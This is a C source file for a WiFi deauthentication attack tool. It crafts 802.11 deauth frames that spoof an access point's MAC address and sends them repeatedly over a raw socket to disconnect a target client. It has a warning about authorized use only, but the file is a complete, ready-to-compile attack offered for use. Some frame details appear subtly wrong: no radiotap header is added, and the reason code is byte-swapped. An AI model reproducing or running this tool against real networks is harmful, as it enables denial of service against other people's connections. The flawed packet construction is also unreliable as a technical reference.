/*
 * WiFi Deauthentication Tool
 *
 * WARNING: This tool is for educational and authorized security testing only.
 * Unauthorized use of this tool is illegal. Use only on networks you own or
 * have explicit permission to test.
 *
 * Compile: gcc -o deauth deauth.c
 * Usage: sudo ./deauth <interface> <target_mac> <ap_mac> [count]
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <sys/ioctl.h>
#include <errno.h>

// IEEE 802.11 Deauth Frame Structure
struct deauth_frame {
    uint8_t type;           // Frame type and subtype (0xC0 for deauth)
    uint8_t flags;          // Frame flags
    uint16_t duration;      // Duration
    uint8_t dest[6];        // Destination MAC (client)
    uint8_t src[6];         // Source MAC (AP)
    uint8_t bssid[6];       // BSSID (AP MAC)
    uint16_t seq;           // Sequence number
    uint16_t reason;        // Reason code
} __attribute__((packed));

// Convert MAC address string to bytes
int mac_str_to_bytes(const char *mac_str, uint8_t *mac_bytes) {
    if (sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &mac_bytes[0], &mac_bytes[1], &mac_bytes[2],
               &mac_bytes[3], &mac_bytes[4], &mac_bytes[5]) != 6) {
        return -1;
    }
    return 0;
}

// Print MAC address
void print_mac(uint8_t *mac) {
    printf("%02x:%02x:%02x:%02x:%02x:%02x",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

// Send deauth frame
int send_deauth(int sockfd, struct sockaddr_ll *socket_address,
                uint8_t *target_mac, uint8_t *ap_mac) {
    struct deauth_frame frame;

    // Build deauth frame
    memset(&frame, 0, sizeof(frame));
    frame.type = 0xC0;      // Deauthentication frame
    frame.flags = 0x00;
    frame.duration = 0x013A;

    // Set destination (client), source (AP), and BSSID (AP)
    memcpy(frame.dest, target_mac, 6);
    memcpy(frame.src, ap_mac, 6);
    memcpy(frame.bssid, ap_mac, 6);

    frame.seq = 0x0000;
    frame.reason = htons(0x0007);  // Class 3 frame received from nonassociated station

    // Send the frame
    if (sendto(sockfd, &frame, sizeof(frame), 0,
               (struct sockaddr*)socket_address, sizeof(*socket_address)) < 0) {
        perror("sendto failed");
        return -1;
    }

    return 0;
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("WiFi Deauthentication Tool\n");
        printf("===========================\n\n");
        printf("Usage: %s <interface> <target_mac> <ap_mac> [count]\n\n", argv[0]);
        printf("Arguments:\n");
        printf("  interface   - Wireless interface in monitor mode (e.g., wlan0mon)\n");
        printf("  target_mac  - Target client MAC address (e.g., AA:BB:CC:DD:EE:FF)\n");
        printf("  ap_mac      - Access Point MAC address (e.g., 11:22:33:44:55:66)\n");
        printf("  count       - Number of deauth frames to send (default: 10)\n\n");
        printf("WARNING: Use only on networks you own or have permission to test!\n");
        return 1;
    }

    char *interface = argv[1];
    char *target_mac_str = argv[2];
    char *ap_mac_str = argv[3];
    int count = (argc > 4) ? atoi(argv[4]) : 10;

    uint8_t target_mac[6], ap_mac[6];

    // Parse MAC addresses
    if (mac_str_to_bytes(target_mac_str, target_mac) < 0) {
        fprintf(stderr, "Error: Invalid target MAC address\n");
        return 1;
    }

    if (mac_str_to_bytes(ap_mac_str, ap_mac) < 0) {
        fprintf(stderr, "Error: Invalid AP MAC address\n");
        return 1;
    }

    // Create raw socket
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd < 0) {
        perror("Socket creation failed");
        fprintf(stderr, "Note: This program requires root privileges\n");
        return 1;
    }

    // Get interface index
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);

    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
        perror("Failed to get interface index");
        fprintf(stderr, "Make sure interface '%s' exists and is in monitor mode\n", interface);
        close(sockfd);
        return 1;
    }

    // Prepare socket address
    struct sockaddr_ll socket_address;
    memset(&socket_address, 0, sizeof(socket_address));
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_ifindex = ifr.ifr_ifindex;
    socket_address.sll_halen = ETH_ALEN;

    // Display configuration
    printf("\n=== Deauth Attack Configuration ===\n");
    printf("Interface:   %s\n", interface);
    printf("Target MAC:  ");
    print_mac(target_mac);
    printf("\n");
    printf("AP MAC:      ");
    print_mac(ap_mac);
    printf("\n");
    printf("Count:       %d\n", count);
    printf("===================================\n\n");

    // Send deauth frames
    printf("Sending deauthentication frames...\n");

    int success = 0;
    for (int i = 0; i < count; i++) {
        if (send_deauth(sockfd, &socket_address, target_mac, ap_mac) == 0) {
            success++;
            printf(".");
            fflush(stdout);
        } else {
            printf("x");
            fflush(stdout);
        }
        usleep(100000);  // 100ms delay between frames
    }

    printf("\n\nSent %d/%d deauth frames successfully\n", success, count);

    close(sockfd);
    return 0;
}
